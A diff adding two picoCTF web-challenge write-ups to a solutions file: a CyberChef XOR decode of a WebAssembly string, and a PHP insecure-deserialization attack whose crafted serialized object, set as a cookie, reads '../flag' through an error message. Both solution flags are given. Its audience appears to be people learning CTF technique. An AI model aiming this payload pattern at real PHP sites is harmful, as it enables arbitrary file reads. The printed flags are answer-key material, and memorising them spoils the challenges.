@@ -319,6 +319,95 @@ Connection: close
 
 Flag: **picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0da16bb2}**
 
+## Some Assembly Required 2 ![p](https://img.shields.io/badge/Points-110-success) ![c](https://img.shields.io/badge/Web-purple)
+
+By inspecting the website source code we can see some Web Assembly, and as done in the part 1 we can go to the last code line and see a string that seems somehow encoded: `xakgK\5cNsl<8?nmi:<i;0j9:;?nm8i=0??:=njn=9u`. This is where [Cyberchef](https://gchq.github.io/CyberChef/) comes in rescue, with the Magic recipe: we can submit an input and it will try to bake everything he can.  
+We can see as a result that the performed operation is probably a XOR, even if the flag is a bit compromised: `picoCT=kF{d407fea24a38b1237fe0a587725fbf51}` maybe is because we roughly copied the value from the website.  
+We can try to download the source code and see if something changes. `+xakgK\Nsl<8?nmi:<i;0j9:;?nm8i=0??:=njn=9u`, so yes (maybe some encoding stuff messed it up).
+
+Re inserting this into Cyberchef gets us the same XOR operation with '8', leading to the flag: **picoCTF{d407fea24a38b1237fe0a587725fbf51}**
+
+I still don't get how this challenge is considered as a Web and how it's 110 points, but I think it's worth to showcase for this awesome Cyberchef tool.
+
+## Super Serial ![p](https://img.shields.io/badge/Points-130-success) ![c](https://img.shields.io/badge/Web-purple)
+> Try to recover the flag stored on this website http://mercury.picoctf.net:42449/
+
+After a classic web recon on this website, the `robots.txt` are interesting: `Disallow: /admin.phps`. Please forgive me, but I didn't know what .phps files were: servers will output a color-formated version of the source code (WOW). So we have access to source codes!
+
+I'm stupid so I tried to access `/admin.phps` directly with no success, until I realized that the index page may be useful: if we access the `index.phps` file we get all the source code we need. Here we can see the first PHP line saying `require_once("cookie.php");`, a reeeeeeaally interesting serialization of a cookie and a redirect `header("Location: authentication.php");`.  
+In index, the server creates a permissions object from the provided username and password.
+
+Let's now access `cookie.phps` where I am sure we will see a deserialization of that cookie, here it is:
+
+```php
+if(isset($_COOKIE["login"])){
+	try{
+		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
+		$g = $perm->is_guest();
+		$a = $perm->is_admin();
+	}
+	catch(Error $e){
+		die("Deserialization error. ".$perm);
+	}
+}
+```
+
+At this point I was a bit stuck, and then I read the hint: _The flag is at ../flag_, so maybe we just need to print things and being admin is not important?  
+The interesting thing is that in the previous code, if an error occurs, we will print the perm object.
+
+Let's now take a look to the `authentication.phps` where we can see an `access_log` class, seems a good name to print data:
+```php
+<?php
+
+class access_log
+{
+	public $log_file;
+
+	function __construct($lf) {
+		$this->log_file = $lf;
+	}
+
+	function __toString() {
+		return $this->read_log();
+	}
+
+	function append_to_log($data) {
+		file_put_contents($this->log_file, $data, FILE_APPEND);
+	}
+
+	function read_log() {
+		return file_get_contents($this->log_file);
+	}
+}
+
+require_once("cookie.php");
+if(isset($perm) && $perm->is_admin()){
+	$msg = "Welcome admin";
+	$log = new access_log("access.log");
+	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
+} else {
+	$msg = "Welcome guest";
+}
+?>
+```
+
+Ok so maybe we got it, the idea is to create serialized `access_log` object and set its `log_file` to `../flag`, set this as the cookie, then let the website to unserialize this and the trigger the error: at this point the `__toString()` function of `access_log` (instead of the `permission` one) should be called and we should see the flag.
+
+I don't know why I crafted by hand the serialized object but here it is my code:
+```php
+<?php
+    $acc_log = 'O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}';
+    echo urlencode(base64_encode($acc_log));
+?>
+```
+
+printing `TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9`.  
+_Explanation_: `O` means Object, `:10` means the object's name is of 10 chars, `:"access_log"` is the object's name, `:1` is the number of the object's fields. `:{` is the start of the field, `s:8` means the field name is a string of 8 chars, `:"log_file;"` is the field's name, `s:7` means the field value is a string of 7 chars, `:"../flag;"` is the field actual value.  
+
+If we set this value to the `login` cookie and perform a request to the `authentication.php` page we get as a result: `Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_9d0864e2}`, as expected.
+
+Flag: **picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_9d0864e2}**
+
 # Reverse Engineering
 ## ARMssembly 0 ![p](https://img.shields.io/badge/Points-40-success) ![c](https://img.shields.io/badge/Reverse-lightblue)
 
